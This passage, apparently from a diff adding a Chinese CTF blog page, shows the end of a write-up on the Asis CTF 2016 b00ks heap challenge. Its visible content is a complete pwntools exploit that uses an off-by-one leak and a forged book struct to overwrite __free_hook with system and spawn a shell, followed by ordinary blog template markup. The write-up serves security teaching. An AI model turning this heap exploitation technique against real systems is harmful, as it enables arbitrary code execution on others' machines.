class="number">7</span>ffd<span class="number">000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/ld-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7ffd000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>ffe<span class="number">000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/ld-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7ffe000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>fff<span class="number">000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="attribute">0x7ffffffde000</span>     <span class="number">0</span>x<span class="number">7</span>ffffffff<span class="number">000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>     <span class="meta"> [stack]</span></span><br><span class="line"><span class="attribute">0xffffffffff600000</span> <span class="number">0</span>xffffffffff<span class="number">601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>     <span class="meta"> [vsyscall]</span></span><br></pre></td></tr></table></figure>
+<h3 id="exp">exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span>(<span class="params">target, name_size, book_name, desc_size, book_desc</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>, book_name)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter book description: &#x27;</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span>(<span class="params">target, book_id</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span>(<span class="params">target, book_id, book_desc</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(book_id))</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter new book description: &#x27;</span>, book_desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_book</span>(<span class="params">target</span>):</span></span><br><span class="line">    target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    target.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author_name</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    target.recv()</span><br><span class="line">    target.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_author_name</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    target.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    target = process(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    target = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># used for debug</span></span><br><span class="line">image_base = <span class="number">0x555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    pwnlib.gdb.attach(target, <span class="string">&#x27;b *%d\nc\n&#x27;</span> % (image_base+<span class="number">0x1245</span>))</span><br><span class="line"></span><br><span class="line">input_author_name(target, <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">create_book(target, <span class="number">140</span> ,<span class="string">&#x27;book_1&#x27;</span>, <span class="number">140</span>, <span class="string">&#x27;first book created&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak boo1_struct addr</span></span><br><span class="line">print_book(target)</span><br><span class="line">target.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">book1_struct_addr = u64(temp[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">book2_struct_addr = book1_struct_addr + <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">create_book(target, <span class="number">0x21000</span>, <span class="string">&#x27;book_2&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;second book create&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake book1_struct</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(book2_struct_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">change_author_name(target, <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment"># leak book2_name ptr</span></span><br><span class="line">print_book(target)</span><br><span class="line"></span><br><span class="line">target.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">temp = target.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line">book2_name_ptr = u64(temp[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># find in debug: mmap_addr - libcbase</span></span><br><span class="line">offset =  <span class="number">0x00007ffff7fb7010</span> - <span class="number">0x7ffff7a0d000</span></span><br><span class="line">libcbase = book2_name_ptr - offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libcbase</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + libcbase</span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(target, <span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(target, <span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">delete_book(target, <span class="number">2</span>)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=http://x1ngg3.github.io/2020/12/02/pwn_off-by-one/>http://x1ngg3.github.io/2020/12/02/pwn_off-by-one/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+
+<section class="widget qrcode  desktop mobile">
+  
+
+  <div class='content article-entry'>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-12-03T01:07:01+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>最后更新于：Dec 3, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pwn/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>pwn</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/heap/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>heap</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/off-by-one/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>off_by_one</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://x1ngg3.github.io/2020/12/02/pwn_off-by-one/&title=Off-by-one - X1ngg3&summary=:aru-39:"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://x1ngg3.github.io/2020/12/02/pwn_off-by-one/&title=Off-by-one - X1ngg3&summary=:aru-39:"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://x1ngg3.github.io/2020/12/02/pwn_off-by-one/&title=Off-by-one - X1ngg3&summary=:aru-39:"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+            
+              <a class='next' href='/2020/11/06/pwn_heap_data_structure/'>
+                <p class='title'>Heap Related Data Structure<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>好难啊
+
+Arena, heap and chunk
+Ptmalloc2通过几种数据结构来进行管理，主要有arena,heap,chunk三种层级。Chunk为分配给用户的内存的一个单位。 对于...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'Off-by-one',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#what-is-off-by-one"><span class="toc-text">what is off-by-one</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84off-by-one%E4%BE%8B%E5%AD%90"><span class="toc-text">两种常见的off-by-one例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E9%94%99%E8%AF%AF"><span class="toc-text">栅栏错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null-byte-off-by-one"><span class="toc-text">null byte off-by-one</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Asis-CTF-2016-b00ks"><span class="toc-text">Asis CTF 2016 b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+  
+    <meting-js
+      theme='#1BCDFC'
+      autoplay='false'
+      volume='0.5'
+      loop='all'
+      order='list'
+      fixed='false'
+      list-max-height='340px'
+      server='netease'
+      type='playlist'
+      id='5356788848'
+      list-folded='true'>
+    </meting-js>
+  
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="https://x1ngg3.github.io"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:x1ngg3@foxmail.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/x1ngg3"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://music.163.com/#/user/home?id=395984459"
+                class="social fas fa-headphones-alt flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        Use
+        <a href="https://x1ngg3.github.io" target="_blank" class="codename">x1ngg3</a>
+        as theme, total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="https://x1ngg3.github.io">Copyright © 2020-2020 X1ngg3</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://i.loli.net/2020/12/02/ZEog3MDmQOd57fx.jpg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "VqJdqrLLhJVaQMiPLwPCBSc3-gzGzoHsz",
+    appKey: "5yKLlbbNmjEzqjXsB8Xq3vfL",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 标准 markdown 描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+ <!-- ҳ������Ч�� -->
+<script type="text/javascript" src="/js/firework.js">
+</script>
+</body>
+</html>
+
